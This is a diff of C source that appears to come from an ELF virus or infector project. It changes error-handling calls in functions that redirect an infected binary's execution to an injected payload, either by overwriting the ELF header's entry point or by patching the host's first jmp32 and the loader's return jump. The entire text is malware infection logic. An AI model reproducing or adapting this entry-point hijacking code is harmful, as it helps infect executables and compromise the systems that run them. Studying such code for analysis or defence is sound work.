@@ -12,7 +12,7 @@ static bool	change_header_entry(struct safe_ptr clone_ref,
 {
 	Elf64_Ehdr	*elf_hdr = safe(clone_ref, 0, sizeof(Elf64_Ehdr));
 
-	if (!elf_hdr) return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);
+	if (!elf_hdr) return errors(ERR_FILE, _ERR_F_READ_EHDR, _ERR_T_CHANGE_HEADER_ENTRY);
 
 	const size_t	payload_offset = entry->payload_offset;
 	const size_t	payload_addr   = entry->payload_addr;
@@ -24,13 +24,13 @@ static bool	change_header_entry(struct safe_ptr clone_ref,
 	const void	*loader_jump  = safe(clone_ref, loader_jump_offset, JMP32_INST_SIZE);
 
 	if (loader_entry == NULL || loader_jump == NULL)
-		return errors(ERR_VIRUS, _ERR_V_CANT_READ_LOADER_CODE);
+		return errors(ERR_FILE, _ERR_F_READ_LOADER, _ERR_T_CHANGE_HEADER_ENTRY);
 
 	const size_t	loader_jump_addr  = payload_addr + (loader_jump - loader_entry);
 	const int32_t	loader_jump_value = entry_addr - (loader_jump_addr + JMP32_INST_SIZE);
 
 	if (!write_jmp32(clone_ref, loader_jump_offset, loader_jump_value))
-		return false;
+		return errors(ERR_THROW, _ERR_NO, _ERR_T_CHANGE_HEADER_ENTRY);
 
 	elf_hdr->e_entry = payload_addr;
 	log_change_header_entry();
@@ -51,7 +51,7 @@ static bool	change_client_jump(struct safe_ptr clone_ref,
 	const void	*client_jump  = find_first_jmp32(clone_ref, entry_offset);
 
 	if (client_entry == NULL)
-		return errors(ERR_THROW, _ERR_T_CHANGE_CLIENT_JUMP);
+		return errors(ERR_THROW, _ERR_NO, _ERR_T_CHANGE_CLIENT_JUMP);
 
 	// drop this way if client can't be parsed
 	if (client_jump == NULL)
@@ -63,14 +63,14 @@ static bool	change_client_jump(struct safe_ptr clone_ref,
 	const void	*loader_jump  = safe(clone_ref, loader_jump_offset, JMP32_INST_SIZE);
 
 	if (loader_jump == NULL || loader_entry == NULL)
-		return errors(ERR_VIRUS, _ERR_V_CANT_READ_LOADER_CODE);
+		return errors(ERR_FILE, _ERR_F_READ_LOADER, _ERR_T_CHANGE_CLIENT_JUMP);
 
 	// get client jump destination
 	const size_t	client_jump_offset = client_jump - clone_ref.ptr;
 	const void	*client_jump_dst   = get_jmp32_destination(clone_ref, client_jump_offset);
 
 	if (client_jump_dst == NULL)
-		return errors(ERR_THROW, _ERR_T_CHANGE_CLIENT_JUMP);
+		return errors(ERR_THROW, _ERR_NO, _ERR_T_CHANGE_CLIENT_JUMP);
 
 	// compute new values for client and loader jumps
 	const size_t	loader_jump_addr     = payload_addr + (loader_jump - loader_entry);
@@ -83,7 +83,7 @@ static bool	change_client_jump(struct safe_ptr clone_ref,
 	// write values
 	if (!write_jmp32(clone_ref, loader_jump_offset, loader_jump_value)
 	|| !write_jmp32(clone_ref, client_jump_offset, client_jump_value))
-		return errors(ERR_THROW, _ERR_T_CHANGE_CLIENT_JUMP);
+		return errors(ERR_THROW, _ERR_NO, _ERR_T_CHANGE_CLIENT_JUMP);
 
 	log_change_client_jump();
 	return true;
@@ -94,7 +94,7 @@ bool	change_entry(struct safe_ptr clone_ref, const struct entry *entry,
 {
 	if (!change_client_jump(clone_ref, entry, dist_clientjmp_loader)
 	&& !change_header_entry(clone_ref, entry, dist_clientjmp_loader))
-		return errors(ERR_THROW, _ERR_T_CHANGE_ENTRY);
+		return errors(ERR_THROW, _ERR_NO, _ERR_T_CHANGE_ENTRY);
 
 	return true;
 }
